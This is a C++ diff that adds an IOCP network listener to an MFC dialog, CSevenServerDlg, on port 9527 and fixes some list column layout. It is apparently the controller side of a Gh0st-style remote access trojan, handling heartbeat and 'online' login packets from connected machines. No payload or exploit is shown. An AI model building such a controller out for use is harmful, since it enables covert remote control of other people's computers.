@@ -22,9 +22,8 @@ COLUMNSTRUCT m_Column_Data[] =
 	{_T("Hostname"),			0.2		},
 	{_T("User"),				0.1		},
 	{_T("Version"),				0.2		},
-	{_T("Comment"),				0.1		},
+	{_T("Comment"),				0.09	},
 };
-
 // 用于应用程序“关于”菜单项的 CAboutDlg 对话框
 
 class CAboutDlg : public CDialogEx
@@ -117,6 +116,8 @@ BOOL CSevenServerDlg::OnInitDialog()
 	m_Column_Count = 6;
 	InitListCtrl();
 
+	StartIOCPServer();
+
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
@@ -181,7 +182,7 @@ void CSevenServerDlg::InitListCtrl()
 	int width = rect.Width();
 	for (int i=0;i<m_Column_Count;i++)
 	{
-		m_listCtrl.InsertColumn(i,m_Column_Data[i].title,LVCFMT_LEFT,(int)width*m_Column_Data[i].nWidth);
+		m_listCtrl.InsertColumn(i,m_Column_Data[i].title,LVCFMT_LEFT,(int)(width*m_Column_Data[i].nWidth));
 	}
 }
 
@@ -190,6 +191,10 @@ void CSevenServerDlg::OnSize(UINT nType, int cx, int cy)
 	//////////////////////////////////////////////////////////////////////////
 	// move list ctrl
 	//////////////////////////////////////////////////////////////////////////
+	if (NULL == m_listCtrl)
+	{
+		return;
+	}
 	CDialogEx::OnSize(nType, cx, cy);
 	CRect rect;
 	this->GetClientRect(&rect);
@@ -197,7 +202,7 @@ void CSevenServerDlg::OnSize(UINT nType, int cx, int cy)
 	int width = rect.Width();
 	for (int i=0;i<m_Column_Count;i++)
 	{
-		m_listCtrl.SetColumnWidth(i,(int)width*m_Column_Data[i].nWidth);
+		m_listCtrl.SetColumnWidth(i,(int)(width*m_Column_Data[i].nWidth));
 	}
 	// TODO: 在此处添加消息处理程序代码
 }
@@ -206,10 +211,10 @@ void CSevenServerDlg::OnSize(UINT nType, int cx, int cy)
 void CSevenServerDlg::OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/)
 {
 	// TODO: 在此处添加消息处理程序代码
-// 	if (m_listCtrl.GetSelectedCount() <= 0)
-// 	{
-// 		return;
-// 	}
+	if (m_listCtrl.GetSelectedCount() <= 0)
+	{
+		return;
+	}
 	//下面的这段代码, 不单单适应于ListCtrl
 	CMenu menu, *pPopup;
 	menu.LoadMenu(IDR_LIST_MENU);
@@ -218,4 +223,96 @@ void CSevenServerDlg::OnContextMenu(CWnd* /*pWnd*/, CPoint /*point*/)
 	ClientToScreen(&myPoint);
 	GetCursorPos(&myPoint); //鼠标位置
 	pPopup->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON, myPoint.x, myPoint.y,this);
+}
+void CSevenServerDlg::StartIOCPServer()
+{
+	m_iocpServer = new CIOCPServer;
+	m_iocpServer->Initialize(NotifyProc,this,10000,9527);
+}
+void CALLBACK CSevenServerDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
+{
+	try
+	{
+		CSevenServerDlg* pThis = (CSevenServerDlg*) lpParam;
+		switch (nCode)
+		{
+		case NC_CLIENT_CONNECT:
+			break;
+		case NC_CLIENT_DISCONNECT:
+			pThis->OnDisconnect(pContext);
+			break;
+		case NC_TRANSMIT:
+			break;
+		case NC_RECEIVE:
+			pThis->ProcessReceive(pContext);
+			break;
+		case NC_RECEIVE_COMPLETE:
+			pThis->ProcessReceiveComplete(pContext);
+			break;
+		}
+	}catch(...){}
+}
+void CSevenServerDlg::ProcessReceive(ClientContext *pContext)
+{
+	return;
+}
+void CSevenServerDlg::ProcessReceiveComplete(ClientContext *pContext)
+{
+	if (pContext == NULL)
+		return;
+
+	// 如果管理对话框打开，交给相应的对话框处理
+	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
+	// 交给窗口处理
+	if (pContext->m_Dialog[0] > 0)
+	{
+		switch (pContext->m_Dialog[0])
+		{
+		case CLIENT_DLG:
+			((ClientDlg *)dlg)->OnReceiveComplete();
+			break;
+		default:
+			break;
+		}
+		return;
+	}
+	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
+	{
+	case BASE_TOKEN_HEARTBEAT: // 回复心跳包
+		{
+			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		}
+
+		break;
+	case BASE_TOKEN_LOGIN: // 上线包
+		{
+			if (m_iocpServer->m_nMaxConnections <= m_listCtrl.GetItemCount())
+			{
+				closesocket(pContext->m_Socket);
+			}
+			else
+			{
+				pContext->m_bIsMainSocket = true;
+				AddToList(pContext);
+			}
+			// 激活
+			BYTE	bToken = COMMAND_ACTIVED;
+			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+		}
+		break;
+		// 命令停止当前操作
+	default:
+		closesocket(pContext->m_Socket);
+		break;
+	}
+	return;
+}
+void CSevenServerDlg::OnDisconnect(ClientContext* pContext)
+{
+	return;
+}
+void CSevenServerDlg::AddToList(ClientContext* pContext)
+{
+	return;
 }
